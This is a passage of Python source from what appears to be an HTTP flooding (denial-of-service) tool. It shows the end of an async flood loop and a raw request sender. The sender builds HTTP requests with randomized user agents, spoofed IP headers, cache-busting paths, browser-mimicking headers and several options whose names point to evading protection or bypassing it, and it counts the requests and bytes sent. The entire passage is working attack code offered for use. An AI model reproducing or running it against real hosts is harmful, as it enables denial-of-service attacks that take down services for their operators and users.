                                self._target.human_repr(),
                                headers={"User-Agent": randchoice(self._useragents)},
                                timeout=aiohttp.ClientTimeout(total=10),
                            ) as resp:
                                REQUESTS_SENT += 1
                        except Exception:
                            pass
            except Exception:
                pass

        try:
            asyncio.run(_mega())
        except Exception:
            pass

    def _async_flood(self):
        """Same as MEGA alias."""
        self._mega_flood()

    def _send_raw_requests(
        self,
        method: str = "GET",
        body: bytes = b"",
        content_type: str = "",
        extra_headers: dict = None,
        custom_path: str = "",
        cache_bust_dynamic: bool = False,
        with_chrome_headers: bool = False,
        accept_encoding: str = "gzip, deflate",
        null_version: bool = False,
        bypass_even: bool = False,
        gsb_trigger: bool = False,
        avb_bypass: bool = False,
        range_attack: bool = False,
        stomp_evasion: bool = False,
        rpc: int = None,
    ):
        """Send raw HTTP requests with various evasion options."""
        rpc = rpc or self._rpc
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(rpc):
                    if self._stop.is_set():
                        return
                    headers = {}
                    path = custom_path or self._cache_bust_path()
                    if extra_headers:
                        headers.update(extra_headers)
                    headers.setdefault("Host", self._target.authority)
                    headers.setdefault("User-Agent", randchoice(self._useragents))
                    headers.setdefault("Accept", "*/*")
                    headers.setdefault("Accept-Language", "en-US,en;q=0.5")
                    headers.setdefault("Accept-Encoding", accept_encoding)
                    headers.setdefault("Connection", "keep-alive")

                    if with_chrome_headers:
                        headers["Upgrade-Insecure-Requests"] = "1"
                        headers["Sec-Fetch-Dest"] = "document"
                        headers["Sec-Fetch-Mode"] = "navigate"
                        headers["Sec-Fetch-Site"] = "none"
                        headers["Sec-Fetch-User"] = "?1"
                    if null_version:
                        method_line = f"{method} / HTTP/0.9\r\n"
                    else:
                        method_line = f"{method} {path} HTTP/1.1\r\n"

                    req = method_line.encode()
                    for k, v in headers.items():
                        req += f"{k}: {v}\r\n".encode()
                    if self.SpoofIP:
                        req += self.SpoofIP.encode()
                    if body:
                        if not content_type:
                            content_type = "application/octet-stream"
                        req += f"Content-Type: {content_type}\r\n".encode()
                        req += f"Content-Length: {len(body)}\r\n".encode()
                    req += b"\r\n"
                    if body:
                        req += body

                    Tools.send(s, req)
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(req)
                break
            except Exception:
                continue
        Tools.safe_close(s)
